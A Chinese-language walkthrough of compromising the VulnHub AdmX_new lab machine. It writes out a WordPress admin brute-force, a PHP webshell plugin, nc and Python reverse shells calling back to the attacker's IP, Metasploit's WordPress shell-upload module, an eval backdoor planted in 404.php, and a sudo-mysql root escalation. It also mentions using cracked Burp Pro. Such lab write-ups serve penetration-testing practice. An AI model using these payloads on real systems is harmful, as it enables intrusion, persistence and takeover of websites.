靶机地址：[AdmX_new](https://download.vulnhub.com/admx/AdmX_new.7z)
需要先配置网络：GRUB选项下按e进入编辑模式，改为单用户启动模式
```
	linux    /vmlinuz-5.4.0-72-generic root=/dev/mapper/ubuntu--\
vg-ubuntu--lv rw single init=/bin/bash
```
按 `Ctrl+x` 或 `F10` 启动
查看网卡名
```Shell
ip a
# enp0s17
```
编辑网络配置文件
```Shell
vi /etc/network/interfaces
# 或
vi /etc/netplan/0x-xx-xx.yaml
```
将网卡名修改为正确的后重启机器即可

主机发现
```Shell
sudo nmap -sn 192.168.1.1/24
# 或
sudo arp-scan -l
# 发现 192.168.1.32
sudo netdiscover -r 192.168.1.1/24
```
端口扫描
```Shell
sudo nmap -p- 192.168.1.32
# 这次端口扫描的时间比较长 要有耐心
```
服务枚举
```Shell
sudo nmap -p80 -sV 192.168.1.32
# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
打开Web页面，没发现什么特别的
Web路径扫描
```Shell
feroxbuster --url http://192.168.1.32
# 比较大 可能会扫很久 但结果也更多
# 或
sudo dirsearch -u http://192.168.1.32
```
发现了路径 `/wordpress/` ，使用BurpSuite查看请求内容
可以看到响应中包含硬编码的地址 `192.168.159.145`
需要拦截请求将 `192.168.159.145` 替换成 `192.168.1.32`
这里可以直接使用BurpSuite提供的功能
`Proxy -> Options -> Match and Replace -> Add`
需要添加两条，分别针对响应头和响应体。
刷新页面，这次可以成功加载了，而且加载的很快。
简单测试没有发现什么漏洞，转而去测试之前扫到的另一个目录 `/wordpress/wp-admin` 。
尝试使用万能密码，失败了。
尝试暴力破解
简单通过搜索引擎搜索，结合手工测试，发现账号 `admin` 存在
这里使用 [SuperWordlist](https://github.com/fuzz-security/SuperWordlist) 里的 `MidPwds.txt` 这个字典
开启拦截，输入一串好定位的字符串作为密码，如 `33334444` ，点击发送请求
`Send to Intruder`
负载位置只设置一个，定位到密码。切换到 `Payloads` 标签页设置字典。
`Payload type` 选择 `Runtime file` ，选择文件后点击 `Start attack` 开始暴破。
社区版暴破很慢，还是得使用破解的专业版，速度快了很多。但是暴破还是个费时的任务。
成功破解出密码：`adam14`
成功登录后台管理，WordPress常见的可以利用的地方包括：
1. Media 上传文件WebShell
2. Appearance 直接编辑PHP代码 如404模板(404.php)
3. Plugins 修改PHP源代码 或者更简单的 写一个插件上传
`webshell.php`
```php
<?php
/**
* Plugin Name: Webshell
* Plugin URI: https://hacker.test
* Description: Wordpress Plugins webshell
* Version: 1.0
* Author: hacker
* Author URI: https://hacker.test
* License: https://nolicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
要先压缩才能上传
```Shell
zip shell.zip webshell.php
```
提示安装成功，点击激活
激活后可以访问，默认插件路径为 `/wordpress/wp-content/plugins/`
访问 `http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=id` ，成功执行命令。
检查 `nc` 等工具是否存在
```
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which nc
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which bash
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which mkfifo
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which python
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which python2
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=which python3
```
反弹shell，发现 `nc` 可以连接，但是无法使用 `-e` 参数
```
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=nc 192.168.1.26 4444
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=nc 192.168.1.26 4444 -e /usr/bin/bash
```
按顺序使用如下命令反弹shell也失败了，原因暂时没搞明白
```
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=rm /tmp/f
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=mkfifo /tmp/f
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=cat /tmp/f | /usr/bin/bash -i 2>&1 | nc 192.168.1.26 4444 > /tmp/f
```
考虑使用 `Python3` 来反弹shell
执行如下命令
```Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.26", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
即
```
http://192.168.1.32/wordpress/wp-content/plugins/webshell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.1.26", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
成功获取到反弹shell
另一种获取反弹shell的方式是通过msf
```Shell
sudo msfdb run
# 或
sudo msfconsole -q
```
搜索相关关键词
```Shell
> search wordpress admin
# 2   exploit/unix/webapp/wp_admin_shell_upload
```
选择模块
```Shell
> use exploit/unix/webapp/wp_admin_shell_upload
# 或 通过序号选择
> use 2
```
查看需要哪些参数
```Shell
> show options
# 重点关注必须设置的参数 及其默认值和描述
```
配置相关参数
```Shell
> set PASSWORD adam14
# PASSWORD => adam14
> set RHOSTS 192.168.1.32
# RHOSTS => 192.168.1.32
> set TARGETURI /wordpress
# TARGETURI => /wordpress
> set USERNAME admin
# USERNAME => admin
```
运行
```Shell
> exploit
# 或
> run
```
跑完会进入 `meterpreter` 环境输入 `shell` 进入shell环境，但这个shell不太完善，很多命令执行有问题。
还是使用之前的Shell，也有问题，没办法正确使用vi编辑文件。需要升级shell交互。
Shell交互升级
```Shell
# 切换成bash
bash
# 重新监听端口获取反弹shell

python3 -c 'import pty; pty.spawn("/bin/bash")'

# <Ctrt-Z> 先挂起

stty raw -echo

fg # 输入这条可能啥也看不到 输一次按回车就行

export SHELL=/bin/bash
export TERM=screen
stty rows 100 columns 200
reset
```
修改主题文件下的代码
```Shell
vi wp-content/themes/twentytwentyone/404.php
```
添加一行
```php
eval($_POST['cmd']);
```
使用蚁剑尝试连接
右键添加
URL地址：`http://192.168.1.32/wordpress/wp-content/themes/twentytwentyone/404.php`
连接密码：`cmd`
点击测试连接，提示连接成功。点击确认添加。
选择右键，打开终端。
使用蚁剑是为了维持shell，虽然这个shell也不太好用，但实际应用中还是比较有用的。
还没拿下，继续提权
```Shell
# 用户枚举
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# wpadmin:x:1001:1001::/home/wpadmin:/bin/bash
```
根据经验要拿的两个flag应该就分别在这两个用户的主目录下，尝试查看，发现没有权限。
查看系统版本
```Shell
uname -a
# Linux wp 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
没有找到可以利用的内核漏洞
再查看自己的sudo权限
```Shell
sudo -l
```
还是失败了
找SUID文件
```Shell
find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
find / -perm -u=s -type f -user wpadmin -executable ! -group root 2>/dev/null -exec ls -l {} \;
```
也没找到
回到这个应用中，可以考虑利用数据库提权。
查看配置文件
```Shell
cat /var/www/html/wordpress/wp-config.php
# define( 'DB_NAME', 'wordpress' );
# define( 'DB_USER', 'admin' );
# define( 'DB_PASSWORD', 'Wp_Admin#123' );
```
看到了数据库账号密码
尝试直接通过这个密码SSH连接，失败了
先连数据库看看
```Shell
mysql -u admin -D wordpress -p'Wp_Admin#123'
```
能够成功连接，但获取不到有用的数据
再通过之前获取到的Web控制台密码 `adam14` 尝试提权
```Shell
su wpadmin
```
成功提权，再次查看当前用户的sudo权限
```Shell
sudo -l
# (root) NOPASSWD: /usr/bin/mysql -u admin -D wordpress -p
```
输入任意密码 `Wp_Admin#123` 成功登录数据库
```Shell
/usr/bin/mysql -u admin -D wordpress -p
```
通过MySQL提权
```Shell
> system id
# 或
> \! bash
```
提权成功
